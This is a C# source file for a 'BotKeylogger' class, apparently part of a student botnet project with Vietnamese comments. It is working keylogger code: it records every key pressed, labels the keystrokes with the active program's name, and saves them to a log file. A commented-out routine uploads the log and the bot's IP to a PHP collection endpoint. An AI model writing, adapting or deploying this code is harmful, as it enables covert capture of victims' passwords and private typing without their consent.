using Client;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using System.Timers;
using System.Windows.Forms;
using System.Windows.Input;

namespace Server
{
    internal class BotKeylogger
    {
        #region Key board
        static WebClient webclient = Program.webClient;
        //private static string logName = "Log_";
        //private static string logExtendtion = ".txt";
        static string pathKeylogger = "keylogger.txt";
        static bool isStarted = false;
        private static DateTime timeStart;
        private static DateTime timeStop;
        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        static System.Timers.Timer timer = new System.Timers.Timer();
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        static string prevProcessName = activeProcessName;
        static Thread th_doKeylogger;

        public static void initBotKeylogger()
        {
            isStarted = true;
            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
            Console.WriteLine("Start keylogger");

        }
        public static void StartKeylogger()
        {
            isStarted = true;

            //File.Create(pathKeylogger);
            // Mở tệp để ghi lại (nếu tệp không tồn tại, nó sẽ tự động được tạo ra)
            using (StreamWriter writer = new StreamWriter(pathKeylogger, false)) // Truyền tham số 'false' để ghi đè tệp hiện có
            {
            }
            Console.WriteLine("Keylogger started.");
        }
        public static void copyFile()
        {
            string sourceFile = pathKeylogger; // Đường dẫn tới tệp nguồn
            string destinationFile = "outputkeylogger.txt"; // Đường dẫn tới tệp đích

            // Mở tệp nguồn để đọc
            using (FileStream sourceStream = new FileStream(sourceFile, FileMode.Open, FileAccess.Read))
            {
                // Mở tệp đích để ghi (nếu tệp đích chưa tồn tại, nó sẽ được tạo)
                using (FileStream destinationStream = new FileStream(destinationFile, FileMode.Create, FileAccess.Write))
                {
                    // Sao chép nội dung từ tệp nguồn sang tệp đích
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = sourceStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        destinationStream.Write(buffer, 0, bytesRead);
                    }
                }
            }
        }
        public static void StopKeylogger()
        {
            isStarted = false;
            Thread.Sleep(500);
            if (File.Exists(pathKeylogger))
            {
                try
                {
                    timeStop = DateTime.Now;
                    copyFile();
                    File.Delete(pathKeylogger   );
                    prevProcessName = null;
                }
                catch (Exception)
                {
                    Console.WriteLine("unable to delete keystrokes.txt");
                }
            }

            Console.WriteLine("Keylogger stopped.");
        }
        static bool isHotKey = false;
        static bool isShowing = false;

        private static void DoKeylogger()
        {
            while (true)
            {
                if (!isStarted) continue;
                string keyPressed = GetNewPressedKeys();
                if(!System.IO.File.Exists("keylogger.txt"))
                {
                    using (FileStream fs = File.Create("keylogger.txt"))
                    {
                        Console.WriteLine("Tao keylogger.txt");
                    }
                }    
                
                if (!IsFileInUse(pathKeylogger))
                {
                    using (StreamWriter sw = new StreamWriter(pathKeylogger, true))
                    {
                        activeProcessName = GetActiveWindowProcessName().ToLower();
                        if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
                        bool isOldProcess = activeProcessName.Equals(prevProcessName);
                        if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)))
                        {
                            sw.WriteLine("\n[--" + activeProcessName + "--]");
                            prevProcessName = activeProcessName;
                        }
                        sw.Write(keyPressed);
                        sw.Close();
                    }
                }
            }
        }
        public static bool IsFileInUse(string filePath)
        {
            try
            {
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                {
                    fs.Close();
                }
                return false;
            }
            catch (IOException)
            {
                return true;
            }
        }
        private static string GetNewPressedKeys()
        {
            string pressedKey = String.Empty;

            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());
                bool down = false;
                if (key != Key.None)
                {
                    down = Keyboard.IsKeyDown(key);
                }

                if (!down && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
                {

                    if (!isCaps())
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString().ToLower(); //by default it is CAPS
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString(); //CAPS
                    }

                }
            }
            return replaceStrings(pressedKey);
        }
        private static string replaceStrings(string input)
        {
            string replacedKey = input;
            switch (input)
            {
                case "space":
                case "Space":
                    replacedKey = " ";
                    break;
                case "return":
                    replacedKey = "\r\n";
                    break;
                case "escape":
                    replacedKey = "[ESC]";
                    break;
                case "leftctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "rightctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "RightShift":
                case "rightshift":
                    replacedKey = "";
                    break;
                case "LeftShift":
                case "leftshift":
                    replacedKey = "";
                    break;
                case "back":
                    replacedKey = "[Back]";
                    break;
                case "lWin":
                    replacedKey = "[WIN]";
                    break;
                case "tab":
                    replacedKey = "[Tab]";
                    break;
                case "Capital":
                    replacedKey = "";
                    break;
                case "oemperiod":
                    replacedKey = ".";
                    break;
                case "D1":
                    replacedKey = "!";
                    break;
                case "D2":
                    replacedKey = "@";
                    break;
                case "oemcomma":
                    replacedKey = ",";
                    break;
                case "oem1":
                    replacedKey = ";";
                    break;
                case "Oem1":
                    replacedKey = ":";
                    break;
                case "oem5":
                    replacedKey = "\\";
                    break;
                case "oemquotes":
                    replacedKey = "'";
                    break;
                case "OemQuotes":
                    replacedKey = "\"";
                    break;
                case "oemminus":
                    replacedKey = "-";
                    break;
                case "delete":
                    replacedKey = "[DEL]";
                    break;
                case "oemquestion":
                    replacedKey = "/";
                    break;
                case "OemQuestion":
                    replacedKey = "?";
                    break;
            }

            return replacedKey;
        }

        private static bool isCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
            if (isCapsLockOn || isShiftKeyPressed) return true;
            else return false;
        }

        private static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName;
        }

        // Các hàm dưới này dùng để lấy dữ liệu đã được ghi trong file keylogger sau đó ghi UploadString vào file php, từ php cập nhật csdl
        //static void onTimedEvent(object sender, EventArgs e)
        //{
        //    Program program = new Program();
        //    String ipBotActive = Program.ipBotActive;
        //    if (!isStarted) return;
        //    try
        //    {
        //        webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
        //        webclient.UploadString("http://localhost/PBL4/sendkeylog.php", "bot=" + ipBotActive + "&keylogger=" + GetKeystrokes());
        //    }
        //    catch (Exception)
        //    {
        //        System.Threading.Thread.Sleep(5000); //If No Client
        //    }
        //}

        ////--[ get keystrokes ]--
        //public static string GetKeystrokes()
        //{

        //    string logNameToRead = logName + DateTime.Now.ToLongDateString() + logExtendtion;
        //    string logContents = File.ReadAllText(logNameToRead);
        //    return logContents;
        //}

        #endregion
    }
}
